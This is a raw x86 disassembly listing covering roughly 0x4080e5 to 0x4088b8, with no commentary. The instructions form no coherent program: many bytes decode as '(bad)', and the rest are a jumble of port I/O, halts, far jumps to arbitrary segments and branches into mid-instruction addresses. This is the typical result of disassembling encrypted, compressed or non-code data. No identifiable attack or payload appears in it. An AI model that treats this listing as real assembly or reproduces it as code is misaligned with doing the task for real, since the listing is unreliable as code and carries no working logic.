  4080e5:	sbb    DWORD PTR [edi+ebx*4+0x70],ebp
  4080e9:	or     DWORD PTR [edx-0x64],ecx
  4080ec:	clc    
  4080ed:	rol    esp,0xc4
  4080f0:	mov    al,0xc8
  4080f2:	pop    esp
  4080f3:	js     0x4080c3
  4080f5:	push   ss
  4080f6:	jb     0x408083
  4080f8:	adc    dh,0x54
  4080fb:	retf   
  4080fc:	sar    BYTE PTR [esi-0x73d16db3],0x2f
  408103:	ret    
  408104:	adc    al,0xd5
  408106:	test   eax,0xfd7eef0e
  40810b:	mov    esp,DWORD PTR [ebx-0x70]
  40810e:	(bad)  
  408110:	in     al,0x3d
  408112:	retfw  0xef6a
  408116:	jmp    0x408159
  408118:	jae    0x408143
  40811a:	sbb    eax,0x4c511303
  40811f:	push   ebx
  408120:	push   esi
  408121:	out    0xdd,al
  408123:	hlt    
  408124:	call   0x6cf2:0xfa06ff7b
  40812b:	sub    BYTE PTR [ebp+0x6c16fb59],cl
  408131:	dec    ebx
  408132:	jne    0x40811a
  408134:	xchg   ecx,eax
  408135:	push   esi
  408136:	outs   dx,BYTE PTR ds:[esi]
  408137:	inc    edi
  408138:	sub    eax,0xc85ceafa
  40813d:	mov    ebx,0x75f87cae
  408142:	dec    esi
  408143:	(bad)
  408147:	daa    
  408148:	pop    edi
  408149:	mov    eax,DWORD PTR [edx+ebp*8-0x1b3c97]
  408150:	nop
  408151:	sbb    DWORD PTR [ebp+0x34d230e2],ebp
  408157:	jmp    0x6d5773a1
  40815c:	mov    edx,0x9d693b33
  408161:	dec    ecx
  408162:	in     eax,0x3d
  408164:	push   0x31
  408166:	add    edi,DWORD PTR [ebx]
  408168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40816a:	xlat   BYTE PTR ds:[ebx]
  40816b:	mov    ch,0x1
  40816d:	xchg   BYTE PTR [esi+0x74f9e2d2],ah
  408173:	in     al,dx
  408174:	in     al,dx
  408175:	mov    WORD PTR [eax],gs
  408177:	imul   ebx,DWORD PTR [ebp+0x6f],0xb8f8408a
  40817e:	cmp    DWORD PTR [ebx+0x6fb4a925],ebx
  408184:	xor    DWORD PTR [eax],ecx
  408186:	and    BYTE PTR [edx],0x1c
  408189:	sbb    cl,dl
  40818b:	test   DWORD PTR [esi],0x3462b7df
  408191:	mov    DWORD PTR [ecx+0x0],esi
  408194:	inc    ebp
  408195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408196:	fild   QWORD PTR [ebx+0x39]
  408199:	outs   dx,DWORD PTR ds:[esi]
  40819a:	sbb    BYTE PTR [esi+eiz*4+0xb1bc267],bl
  4081a1:	int3   
  4081a2:	xor    ebp,DWORD PTR [esi]
  4081a4:	or     dh,BYTE PTR [ebx-0x73]
  4081a7:	mov    al,ds:0xddf2b0bd
  4081ac:	lds    ebx,FWORD PTR [ecx+edx*8+0x7884d073]
  4081b3:	mov    ebx,0x98128332
  4081b8:	adc    eax,0x1fabc82d
  4081bd:	loop   0x4081bc
  4081bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c1:	jo     0x40821d
  4081c3:	xor    al,0x48
  4081c5:	arpl   WORD PTR [esi],cx
  4081c7:	sbb    al,0x38
  4081c9:	cli    
  4081ca:	pop    es
  4081cb:	call   0x64f9cff0
  4081d0:	adc    dl,ah
  4081d2:	cmp    DWORD PTR [ebp-0x3c],0x57
  4081d6:	pop    eax
  4081d7:	add    ch,dl
  4081d9:	xor    eax,0xbbe7488c
  4081de:	icebp  
  4081df:	inc    esi
  4081e0:	pop    ebp
  4081e1:	jg     0x40822d
  4081e3:	ret    0xdb27
  4081e6:	ins    BYTE PTR es:[edi],dx
  4081e7:	add    DWORD PTR [eax+0x13],edx
  4081ea:	sub    al,0x1c
  4081ec:	pop    es
  4081ed:	fidiv  WORD PTR [ecx+eiz*2-0x68]
  4081f1:	jp     0x408225
  4081f3:	sbb    eax,0xcaf1ba44
  4081f8:	loope  0x40825f
  4081fa:	aad    0x16
  4081fc:	cwde   
  4081fd:	dec    edx
  4081fe:	or     edi,DWORD PTR [ecx-0x76]
  408201:	xchg   DWORD PTR [edx-0x4c],esp
  408204:	xchg   ecx,eax
  408205:	jle    0x4081de
  408207:	cmp    edx,DWORD PTR [ebx]
  408209:	jmp    0xb9ab:0x8b92afe4
  408210:	hlt    
  408211:	jmp    0x4081b1
  408213:	jecxz  0x4081f4
  408215:	jmp    0x408277
  408217:	imul   edx,DWORD PTR [esi-0x2362f2f0],0x18
  40821e:	mov    eax,ds:0xe5ff794c
  408223:	xor    BYTE PTR [edx+0x5de0a1a2],ah
  408229:	jle    0x40827e
  40822b:	or     al,0xd2
  40822d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40822e:	ds or  eax,0x9ff8479
  408234:	mov    dl,0x73
  408236:	dec    ebx
  408237:	jo     0x40823c
  408239:	repz or edx,DWORD PTR [ebp+0x74]
  40823d:	out    dx,al
  40823e:	and    ebx,edx
  408240:	push   ebp
  408241:	cmp    al,0x76
  408243:	pop    edx
  408244:	std    
  408245:	bound  esp,QWORD PTR [edi]
  408247:	push   edx
  408248:	push   0xf6d59359
  40824d:	loope  0x4082ca
  40824f:	gs jg  0x408236
  408252:	adc    eax,0x66383803
  408257:	add    DWORD PTR [edx-0x3ffcd278],0x9095b668
  408261:	sbb    DWORD PTR [ebp-0x675f332e],0x44
  408268:	scas   al,BYTE PTR es:[edi]
  408269:	or     dl,BYTE PTR [edi+0x2]
  40826c:	xlat   BYTE PTR ds:[ebx]
  40826d:	jb     0x408208
  40826f:	daa    
  408270:	xchg   ebx,eax
  408271:	test   BYTE PTR [ecx+0x6b],dh
  408274:	or     esi,edi
  408276:	dec    edx
  408277:	pop    ss
  408278:	ds sbb al,0xc4
  40827b:	into   
  40827c:	xchg   DWORD PTR [edx-0x28524523],ecx
  408282:	lods   eax,DWORD PTR ds:[esi]
  408283:	lods   al,BYTE PTR ds:[esi]
  408284:	addr16 mov bl,0x2c
  408287:	mov    al,0x9c
  408289:	retf   0x9fb
  40828c:	push   esp
  40828d:	or     al,0x19
  40828f:	(bad)
  408292:	in     eax,0x3c
  408294:	or     al,0x48
  408296:	mov    cl,0x14
  408298:	not    BYTE PTR [ebx+0x2b2d656c]
  40829e:	sbb    DWORD PTR [edx-0x19],edi
  4082a1:	push   0x86545b0c
  4082a6:	scas   al,BYTE PTR es:[edi]
  4082a7:	(bad)
  4082aa:	ins    BYTE PTR es:[edi],dx
  4082ab:	push   ds
  4082ac:	xchg   edi,eax
  4082ad:	mov    dl,0xfd
  4082af:	push   eax
  4082b0:	fs inc edi
  4082b2:	xlat   BYTE PTR ds:[ebx]
  4082b3:	stc    
  4082b4:	mov    ?,WORD PTR [edi+0x23]
  4082b7:	ins    DWORD PTR es:[edi],dx
  4082b8:	xchg   ebp,eax
  4082b9:	inc    esi
  4082ba:	jl     0x4082b8
  4082bc:	stos   DWORD PTR es:[edi],eax
  4082bd:	xchg   BYTE PTR [edi+0x9],cl
  4082c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c1:	inc    BYTE PTR [eax-0x5ac822f5]
  4082c7:	mov    cl,0x64
  4082c9:	jg     0x408295
  4082cb:	ins    BYTE PTR es:[edi],dx
  4082cc:	or     al,0x7
  4082ce:	inc    eax
  4082cf:	popa   
  4082d0:	js     0x4082a2
  4082d2:	es and dh,bl
  4082d5:	dec    eax
  4082d6:	js     0x4082b3
  4082d8:	cmp    DWORD PTR [ebx+0x49897123],edi
  4082de:	repnz add al,0x19
  4082e1:	pop    ebp
  4082e2:	daa    
  4082e3:	aaa    
  4082e4:	xor    eax,DWORD PTR [edx-0x5db429a6]
  4082ea:	enter  0x656a,0x30
  4082ee:	add    eax,0x8ad84c78
  4082f3:	retf   
  4082f4:	mov    cl,0x3f
  4082f6:	mov    ebp,0x41319da8
  4082fb:	mov    edi,0x954c03c0
  408300:	dec    esi
  408301:	not    BYTE PTR [eax]
  408303:	pop    ecx
  408304:	shl    dh,cl
  408306:	push   cs
  408307:	dec    esp
  408308:	sbb    eax,0x496b710f
  40830d:	add    BYTE PTR [ecx+esi*1],0xa1
  408311:	inc    esi
  408312:	add    esi,DWORD PTR [eax+eax*2-0x71]
  408316:	pop    esp
  408317:	mov    WORD PTR [ecx],gs
  408319:	xor    DWORD PTR [ebx-0x36],ebp
  40831c:	or     eax,0x2fdb6938
  408321:	pushf  
  408322:	xor    eax,0xaa8d32ea
  408327:	xor    eax,0xd5896387
  40832c:	pop    es
  40832d:	inc    edi
  40832e:	xchg   ecx,eax
  40832f:	xchg   esi,edi
  408331:	pop    edi
  408332:	mov    ch,0xb0
  408334:	dec    esp
  408335:	pusha  
  408336:	push   cs
  408337:	jnp    0x408358
  408339:	test   eax,0x5e975a49
  40833e:	jnp    0x40837f
  408340:	popf   
  408341:	test   DWORD PTR [esi+0x1aee3788],edi
  408347:	xor    ah,BYTE PTR es:[eax+0x35]
  40834b:	cld    
  40834c:	ficomp DWORD PTR [edi+0x2d3d5370]
  408352:	stos   DWORD PTR es:[edi],eax
  408353:	cwde   
  408354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408355:	cmp    BYTE PTR [edi+0x4a],0xc6
  408359:	bound  esi,QWORD PTR [ecx+0x21ba2040]
  40835f:	outs   dx,DWORD PTR ds:[esi]
  408360:	add    ecx,eax
  408362:	or     ah,dh
  408364:	ret    0x6b0d
  408367:	aaa    
  408368:	test   eax,0x7a662182
  40836d:	cld    
  40836e:	jl     0x408358
  408370:	lds    ebp,FWORD PTR [ecx-0x12aa6a9c]
  408376:	mov    ebp,0x784b8fdc
  40837b:	test   eax,0xf2104e1c
  408380:	addr16 in al,0x33
  408383:	rol    edi,0xb
  408386:	int3   
  408387:	adc    dl,dh
  408389:	in     al,0xb5
  40838b:	ja     0x40838d
  40838d:	sub    al,0xdc
  40838f:	fs ret 
  408391:	jne    0x40835a
  408393:	push   ebp
  408394:	dec    edx
  408395:	jmp    0x408330
  408397:	fmul   st(7),st
  408399:	clc    
  40839a:	add    al,0xa7
  40839c:	xor    al,BYTE PTR [edi]
  40839e:	fsub   DWORD PTR [ebx+0x28]
  4083a1:	pop    esi
  4083a2:	into   
  4083a3:	pop    ecx
  4083a4:	sub    BYTE PTR [ebx],al
  4083a6:	mov    ebp,0xb16a74e0
  4083ab:	gs inc eax
  4083ad:	pop    esi
  4083ae:	add    al,0x12
  4083b0:	pop    edx
  4083b1:	(bad)  
  4083b2:	shl    edi,1
  4083b4:	std    
  4083b5:	and    cl,BYTE PTR [ebp+ebp*1-0x321e56d4]
  4083bc:	std    
  4083bd:	mov    ebp,0x87d286f5
  4083c2:	test   BYTE PTR [esi-0x2d71c9ef],bh
  4083c8:	sub    bl,BYTE PTR [edx]
  4083ca:	loop   0x40834f
  4083cc:	lods   eax,DWORD PTR ds:[esi]
  4083cd:	lods   eax,DWORD PTR ds:[esi]
  4083ce:	cmp    eax,0xe6a065a5
  4083d3:	(bad)  
  4083d4:	jo     0x4083d7
  4083d6:	test   al,0x58
  4083d8:	pop    ecx
  4083d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083da:	rcr    ecx,0xb6
  4083dd:	mov    bl,0x2
  4083df:	stos   BYTE PTR es:[edi],al
  4083e0:	test   edi,eax
  4083e2:	xchg   ecx,eax
  4083e3:	and    eax,edx
  4083e5:	icebp  
  4083e6:	out    dx,eax
  4083e7:	(bad)  
  4083e9:	fs push ebp
  4083eb:	sbb    esp,DWORD PTR cs:[ecx]
  4083ee:	mov    edi,0x579673f9
  4083f3:	pop    ds
  4083f4:	mov    ebp,0xfd393e11
  4083f9:	fmul   DWORD PTR [edx-0x6a]
  4083fc:	inc    edx
  4083fd:	jmp    0x4083b2
  4083ff:	lea    esi,[esi+0x20da9740]
  408405:	jl     0x4083e1
  408407:	adc    cl,cl
  408409:	or     BYTE PTR [edx+0x611b3cde],ch
  40840f:	sbb    BYTE PTR [eax+0x65a6cd6b],0x2a
  408416:	call   0x820a609e
  40841b:	ss fwait
  40841d:	jecxz  0x40841a
  40841f:	fldcw  WORD PTR [esi+0x2d41846d]
  408425:	push   ebp
  408426:	pushf  
  408427:	int3   
  408428:	add    DWORD PTR [esi-0x59515366],edx
  40842e:	push   0x7c
  408430:	mov    bh,0x86
  408432:	outs   dx,DWORD PTR ds:[esi]
  408433:	stc    
  408434:	adc    dh,al
  408436:	xor    ebp,DWORD PTR [ebx+0x62]
  408439:	jmp    0x5d99:0x37e08b78
  408440:	add    al,0x7d
  408442:	xchg   edi,eax
  408443:	dec    esi
  408444:	xor    eax,0x4de18241
  408449:	neg    DWORD PTR [ebx]
  40844b:	ins    BYTE PTR es:[edi],dx
  40844c:	push   0x36a28826
  408451:	dec    edx
  408452:	pop    ss
  408453:	mov    ch,0xfb
  408455:	sbb    eax,0xfe1e6206
  40845a:	sub    DWORD PTR [edi+0x6f2ddcd3],ebp
  408460:	and    eax,DWORD PTR [ecx-0x20b438ce]
  408466:	(bad)  
  408467:	aaa    
  408468:	mov    DWORD PTR [eax],edx
  40846a:	ja     0x4084be
  40846c:	add    bl,bh
  40846e:	shl    BYTE PTR [ebp-0x69],0xca
  408472:	xchg   ebx,eax
  408473:	mov    ebx,0x359a55f2
  408478:	test   al,0x0
  40847a:	push   ebx
  40847b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40847c:	mov    eax,ds:0xd0678c37
  408481:	mov    ah,BYTE PTR [eax-0x30720d3e]
  408487:	cdq    
  408488:	sti    
  408489:	dec    eax
  40848a:	mov    dl,0xc1
  40848c:	fdivr  QWORD PTR [esi-0x6c7292d7]
  408492:	clc    
  408493:	into   
  408494:	shr    DWORD PTR [ebp-0x1837e279],1
  40849a:	and    eax,0x81abafee
  40849f:	add    cl,BYTE PTR [ebx+0x19]
  4084a2:	mov    dl,0xba
  4084a4:	ret    
  4084a5:	add    eax,0x6b8d127
  4084aa:	xchg   ecx,eax
  4084ab:	push   ebp
  4084ac:	mov    BYTE PTR [ecx-0x80],0x8d
  4084b0:	stos   BYTE PTR es:[edi],al
  4084b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084b2:	scas   eax,DWORD PTR es:[edi]
  4084b3:	jo     0x40851c
  4084b5:	add    edx,0xce3e800e
  4084bb:	dec    ecx
  4084bc:	sub    cl,al
  4084be:	cdq    
  4084bf:	gs loopne 0x4084d7
  4084c2:	xchg   BYTE PTR [esi-0x6af22340],dh
  4084c8:	cwde   
  4084c9:	jne    0x408544
  4084cb:	mov    ah,0xe3
  4084cd:	imul   ebp,DWORD PTR [ecx-0x67],0x93c746eb
  4084d4:	ret    0xf352
  4084d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084d8:	imul   ecx,DWORD PTR [ebx+0x2f91a912],0x6c
  4084df:	shl    dh,cl
  4084e1:	and    esp,eax
  4084e3:	leave  
  4084e4:	ds push cs
  4084e6:	iret   
  4084e7:	inc    eax
  4084e9:	iret   
  4084ea:	(bad)
  4084ee:	dec    ebp
  4084ef:	xor    al,0x7d
  4084f1:	or     BYTE PTR [ebx+0x5153c6b7],al
  4084f7:	or     al,0xa6
  4084f9:	cmp    bl,BYTE PTR [edi]
  4084fb:	xor    al,0xe1
  4084fd:	stos   DWORD PTR es:[edi],eax
  4084fe:	addr16 mov ebx,0x991889b7
  408504:	fsub   QWORD PTR [ecx-0xeb2dc8]
  40850a:	stc    
  40850b:	dec    ebx
  40850c:	jbe    0x40853b
  40850e:	outs   dx,BYTE PTR ds:[esi]
  40850f:	sbb    ch,BYTE PTR [ebx]
  408511:	hlt    
  408512:	mov    ch,0xe7
  408514:	mov    ds:0xad3893cc,eax
  408519:	mov    ebx,0x509532f0
  40851e:	jae    0x408566
  408520:	cmp    ax,0x626
  408524:	(bad)  [edi+0x54433d57]
  40852a:	mov    cl,0xf0
  40852c:	pop    ebx
  40852d:	xchg   ebx,eax
  40852e:	scas   al,BYTE PTR es:[edi]
  40852f:	mov    ds:0xe4d8435b,eax
  408534:	xor    edx,DWORD PTR [edx+0x2a0b6a85]
  40853a:	lahf   
  40853b:	(bad)
  40853e:	push   cs
  40853f:	lea    esi,[esi+edi*8+0x9b9404f]
  408546:	stos   DWORD PTR es:[edi],eax
  408547:	popf   
  408548:	mov    eax,DWORD PTR [edx]
  40854a:	dec    edx
  40854b:	mov    bl,0xcb
  40854d:	adc    BYTE PTR [edi],al
  40854f:	xor    eax,0xcac183c
  408554:	add    dl,BYTE PTR [esi+0x18fd77c7]
  40855a:	into   
  40855b:	int    0x85
  40855d:	dec    ebp
  40855e:	je     0x4085c5
  408560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408561:	outs   dx,BYTE PTR ds:[esi]
  408562:	mov    ebp,0x1fdcf9d9
  408567:	jg     0x40854b
  408569:	cmc    
  40856a:	push   cs
  40856b:	adc    dh,BYTE PTR [ebp-0x15a87c40]
  408571:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  408573:	jl     0x408562
  408575:	nop
  408576:	add    BYTE PTR [ebx],ch
  408578:	icebp  
  408579:	jecxz  0x40853d
  40857b:	int3   
  40857c:	out    dx,eax
  40857d:	sub    ebp,DWORD PTR [ebx]
  40857f:	retf   0x57e3
  408582:	sbb    DWORD PTR ds:0xbe9e0171,0x155fb769
  40858c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40858d:	adc    edi,ebp
  40858f:	aad    0xb2
  408591:	stc    
  408592:	jle    0x408604
  408594:	push   esp
  408595:	aad    0xb3
  408597:	adc    DWORD PTR [ecx+0x4d],esi
  40859a:	sbb    eax,0x3b7a4c82
  40859f:	mov    bh,0xed
  4085a1:	test   ah,al
  4085a3:	pusha  
  4085a4:	js     0x408546
  4085a6:	xor    BYTE PTR [esi-0x51],dh
  4085a9:	jnp    0x40858d
  4085ab:	aad    0x9d
  4085ad:	mov    eax,ds:0x4e065844
  4085b2:	fcomi  st,st(7)
  4085b4:	stos   DWORD PTR es:[edi],eax
  4085b5:	ins    DWORD PTR es:[edi],dx
  4085b6:	aad    0xf7
  4085b8:	cmp    BYTE PTR [ebp-0x9b0907a],al
  4085be:	lahf   
  4085bf:	sub    DWORD PTR [ecx-0x67],edx
  4085c2:	js     0x408569
  4085c4:	cli    
  4085c5:	jmp    0xd671aa06
  4085ca:	mov    ds:0x60bf964d,eax
  4085cf:	sub    ah,BYTE PTR [ebp-0x35284ea2]
  4085d5:	(bad)  
  4085d6:	std    
  4085d7:	dec    edi
  4085d8:	jns    0x408637
  4085da:	fstp   TBYTE PTR [ecx-0x16b5fb34]
  4085e0:	sbb    BYTE PTR [ebx],bl
  4085e2:	imul   edi,esi,0x455af5c4
  4085e8:	fiadd  DWORD PTR ds:0x590379f9
  4085ee:	push   ds
  4085ef:	mov    edi,0x79bfff30
  4085f4:	cmp    al,dh
  4085f6:	ret    0x3bb6
  4085f9:	in     al,dx
  4085fa:	fwait
  4085fb:	mov    eax,ds:0x3fdf222d
  408600:	mov    ah,0xaa
  408602:	in     eax,0xd8
  408604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408605:	xchg   ebp,eax
  408606:	or     al,0x68
  408608:	mov    edi,0xca2796f5
  40860d:	scas   eax,DWORD PTR es:[edi]
  40860e:	xor    eax,0x76f3f490
  408613:	mov    ebp,0x4b505009
  408618:	das    
  408619:	sub    edx,DWORD PTR [esi-0x6b]
  40861c:	nop
  40861d:	pop    ebx
  40861e:	out    0x9a,al
  408620:	xor    DWORD PTR [esi],edx
  408622:	pop    ebp
  408623:	mov    esp,0x6f86802f
  408628:	add    al,0xd4
  40862a:	out    dx,al
  40862b:	add    al,0x12
  40862d:	shl    BYTE PTR [ebx+edi*2-0x5a],1
  408631:	shl    edi,cl
  408633:	cmp    BYTE PTR [edx-0x7f7957e5],dh
  408639:	sub    bl,BYTE PTR [ecx-0x5d]
  40863c:	mov    bh,0xd7
  40863e:	dec    ebx
  40863f:	add    eax,0xcf1c59c6
  408644:	push   esi
  408645:	das    
  408646:	rcl    BYTE PTR [ecx+eiz*8],1
  408649:	push   cs
  40864a:	shr    ch,1
  40864c:	xchg   ecx,eax
  40864d:	ret    0x4545
  408650:	push   esi
  408651:	xor    BYTE PTR [edx-0x6cf2aade],0x35
  408658:	xchg   ecx,eax
  408659:	ss aam 0x68
  40865c:	cmp    al,0xe5
  40865e:	pop    esp
  40865f:	(bad)  
  408660:	pop    ebx
  408661:	sahf   
  408662:	inc    edi
  408663:	pop    edi
  408664:	mov    DWORD PTR [edi],0xd91d9e34
  40866a:	add    DWORD PTR [ebx],edx
  40866c:	dec    edx
  40866d:	je     0x4086b1
  40866f:	outs   dx,DWORD PTR ds:[esi]
  408670:	add    al,0xc1
  408672:	mov    ds:0x7d694ba,eax
  408677:	mov    eax,ds:0x939cdeda
  40867c:	inc    esi
  40867d:	adc    eax,0x131dc0e8
  408682:	aas    
  408683:	sahf   
  408684:	fist   DWORD PTR [ebx+0x7f]
  408687:	mov    eax,0x67d5de7a
  40868c:	sbb    eax,0x4ee59cc5
  408691:	sbb    ebx,DWORD PTR [edx+0x15]
  408694:	add    ah,BYTE PTR [edx]
  408696:	test   DWORD PTR [edi-0x4e9b277a],0x271ce68a
  4086a0:	sub    al,0x9
  4086a2:	loope  0x408719
  4086a4:	das    
  4086a5:	fsub   QWORD PTR ds:0xcac1049b
  4086ab:	xchg   edx,eax
  4086ac:	sti    
  4086ad:	int3   
  4086ae:	out    0x55,eax
  4086b0:	bts    DWORD PTR [edi],ecx
  4086b3:	push   ebx
  4086b4:	sbb    eax,0x57527675
  4086b9:	cmc    
  4086ba:	dec    edx
  4086bb:	packssdw mm1,QWORD PTR [esi+edx*1+0x36]
  4086c0:	pop    esi
  4086c1:	out    0xf9,eax
  4086c3:	inc    ebp
  4086c4:	aaa    
  4086c5:	push   eax
  4086c6:	inc    edi
  4086c7:	daa    
  4086c8:	retf   
  4086c9:	xor    eax,0xbfdbcc07
  4086ce:	or     ebp,esi
  4086d0:	jns    0x4086aa
  4086d2:	or     DWORD PTR [ebx+0x3ce95aed],eax
  4086d8:	xchg   esi,eax
  4086d9:	dec    eax
  4086da:	lahf   
  4086db:	add    BYTE PTR [ebx+0x40d89914],ch
  4086e1:	lods   al,BYTE PTR ds:[esi]
  4086e2:	rcl    DWORD PTR [edx],0xaa
  4086e5:	mov    cl,0x45
  4086e7:	push   cs
  4086e8:	lods   eax,DWORD PTR ds:[esi]
  4086e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086ea:	dec    edi
  4086eb:	mov    ebp,0x452dbdfe
  4086f0:	out    dx,eax
  4086f1:	inc    ebx
  4086f2:	cld    
  4086f3:	std    
  4086f4:	push   0xd2a7e760
  4086f9:	out    0xd8,eax
  4086fb:	int    0xc4
  4086fd:	pushf  
  4086fe:	out    0xf1,al
  408700:	aaa    
  408701:	mov    dl,al
  408703:	mov    esi,0x5d205c2a
  408708:	cld    
  408709:	or     BYTE PTR [ecx-0x1f003d0f],ah
  40870f:	push   esi
  408710:	sbb    BYTE PTR ds:0x764e0d28,ch
  408716:	jl     0x408788
  408718:	dec    esi
  408719:	stos   BYTE PTR es:[edi],al
  40871a:	es fwait
  40871c:	xor    BYTE PTR [ecx],cl
  40871e:	enter  0xc9c3,0x19
  408722:	or     BYTE PTR [edi-0x5b1b07d3],al
  408728:	lods   eax,DWORD PTR ds:[esi]
  408729:	ss push es
  40872b:	fidivr DWORD PTR [edx]
  40872d:	sbb    esp,DWORD PTR [esi]
  40872f:	outs   dx,DWORD PTR ds:[esi]
  408730:	aas    
  408731:	mov    ds:0x1c8c6a1e,eax
  408736:	and    BYTE PTR ds:0x3c4223f1,0xea
  40873d:	sub    ebx,ebx
  40873f:	sar    BYTE PTR [ebp+0x5c2f2347],0xbd
  408746:	dec    ebx
  408747:	imul   esi,DWORD PTR [edx+0x66],0x7c
  40874b:	push   ds
  40874c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40874d:	fwait
  40874e:	inc    eax
  40874f:	repnz adc esi,ebx
  408752:	jle    0x40870c
  408754:	out    dx,eax
  408755:	fwait
  408756:	and    cl,al
  408758:	pop    edx
  408759:	retf   
  40875a:	xor    ebx,esi
  40875c:	xchg   esp,eax
  40875d:	mov    edi,esi
  40875f:	mov    edi,0x6591425e
  408764:	mov    al,ds:0x67489d7a
  408769:	in     al,0x3d
  40876b:	mov    esi,0x57cc9d93
  408770:	fadd   DWORD PTR [ecx+0x273a9e90]
  408776:	ror    bl,0x4c
  408779:	mov    al,0x8b
  40877b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40877c:	scas   eax,DWORD PTR es:[edi]
  40877d:	inc    BYTE PTR [esi+eiz*1]
  408780:	jo     0x408712
  408782:	shr    BYTE PTR [ecx],1
  408784:	or     ebx,edi
  408786:	and    al,0x15
  408788:	pusha  
  408789:	je     0x40877a
  40878b:	or     DWORD PTR [ebx+0x7c],ebx
  40878e:	inc    ebx
  40878f:	pop    ss
  408790:	add    BYTE PTR [ecx],dl
  408792:	and    DWORD PTR [eax],edx
  408794:	adc    eax,ebx
  408796:	popa   
  408797:	ret    
  408798:	ds mov dl,0xcd
  40879b:	sbb    al,0xf4
  40879d:	cmp    al,0xf7
  40879f:	push   ds
  4087a0:	js     0x4087b8
  4087a2:	es xchg ecx,eax
  4087a4:	in     al,dx
  4087a5:	ins    DWORD PTR es:[edi],dx
  4087a6:	inc    esp
  4087a7:	jne    0x408752
  4087a9:	jmp    0x4087ef
  4087ab:	lds    esi,FWORD PTR [ebp+ebp*4-0x6d]
  4087af:	out    0x2f,eax
  4087b1:	ret    
  4087b2:	add    eax,DWORD PTR [ecx-0x3c]
  4087b5:	fwait
  4087b6:	out    0xee,al
  4087b8:	aam    0xad
  4087ba:	das    
  4087bb:	into   
  4087bc:	or     bh,al
  4087be:	xor    eax,0x68d4b05d
  4087c3:	mov    ah,0x54
  4087c5:	scas   eax,DWORD PTR es:[edi]
  4087c6:	push   ebp
  4087c7:	xchg   DWORD PTR [edi-0x178e44a2],eax
  4087cd:	rcr    bl,0x79
  4087d0:	out    dx,eax
  4087d1:	sub    eax,0x313544c5
  4087d6:	mov    ss,WORD PTR [ebx]
  4087d8:	inc    edx
  4087d9:	sub    ch,ch
  4087db:	jecxz  0x4087d6
  4087dd:	xor    bh,ch
  4087df:	dec    edx
  4087e0:	mov    al,ds:0xa6826567
  4087e5:	add    BYTE PTR [ecx],bh
  4087e7:	loope  0x408853
  4087e9:	sub    al,0x13
  4087eb:	stos   BYTE PTR es:[edi],al
  4087ec:	push   eax
  4087ed:	mov    dl,0x2a
  4087ef:	push   esi
  4087f0:	loope  0x40880b
  4087f2:	jns    0x4087ce
  4087f4:	and    edi,ebx
  4087f6:	jnp    0x408857
  4087f8:	(bad)  
  4087f9:	lock add BYTE PTR [ecx+0x6a221050],ch
  408800:	retf   
  408801:	out    0x49,eax
  408803:	mov    dh,0xd4
  408805:	push   esi
  408806:	dec    ecx
  408807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408808:	cli    
  408809:	push   DWORD PTR [ebx+ebp*8-0x15718811]
  408810:	and    DWORD PTR [ecx-0x18aa2718],edi
  408816:	mov    dh,0x18
  408818:	dec    esi
  408819:	adc    eax,0x5e4a6a67
  40881e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40881f:	mov    bl,cl
  408821:	jne    0x40887d
  408823:	add    bl,bh
  408825:	data16 jp 0x408804
  408828:	sub    bh,ah
  40882a:	cmp    BYTE PTR [eax-0x1a],0x13
  40882e:	jmp    0x40885f
  408830:	imul   edx,DWORD PTR [esi+eiz*1+0x7b],0xfffffffe
  408835:	jge    0x408890
  408837:	fwait
  408838:	pop    esp
  408839:	(bad)  
  40883a:	push   DWORD PTR [ebx+0x11]
  40883d:	sub    esi,esi
  40883f:	xchg   DWORD PTR [ecx-0x4f911af9],esp
  408845:	mov    ebp,0xa8626911
  40884a:	xor    eax,0x807adef1
  40884f:	fwait
  408850:	test   BYTE PTR [esi+0x770ce732],al
  408856:	cwde   
  408857:	int    0xfe
  408859:	xchg   edx,eax
  40885a:	in     al,0xb7
  40885c:	mov    esp,0x5404949
  408861:	xchg   edi,eax
  408862:	scas   al,BYTE PTR es:[edi]
  408863:	jg     0x408820
  408865:	ins    DWORD PTR es:[edi],dx
  408866:	addr16 jne 0x4087fb
  408869:	jg     0x408873
  40886b:	(bad)  
  40886c:	pop    eax
  40886d:	scas   eax,DWORD PTR es:[edi]
  40886e:	pop    esi
  40886f:	cmp    DWORD PTR [ebx-0x39a71a5c],0x5a08fd6d
  408879:	fwait
  40887a:	mov    es,WORD PTR [ebx-0x207196e3]
  408880:	outs   dx,DWORD PTR ds:[esi]
  408881:	fwait
  408882:	loop   0x40880e
  408884:	es mov ah,0xb8
  408887:	out    0xa1,al
  408889:	mov    ebp,0x81a7053a
  40888e:	xor    al,BYTE PTR [edi]
  408890:	nop
  408891:	cmp    al,0xdc
  408893:	mov    edi,0x850738ea
  408898:	call   0x29ce:0x5082957d
  40889f:	int    0x59
  4088a1:	sub    DWORD PTR [ebx-0x3d],esp
  4088a4:	or     BYTE PTR [edx],cl
  4088a6:	push   ds
  4088a7:	jns    0x4088da
  4088a9:	and    DWORD PTR ds:0xd9ea2bcd,ecx
  4088af:	xor    DWORD PTR [ecx+ebx*4+0x7cd07383],ecx
  4088b6:	add    esi,ebp
  4088b8:	scas   eax,DWORD PTR es:[edi]
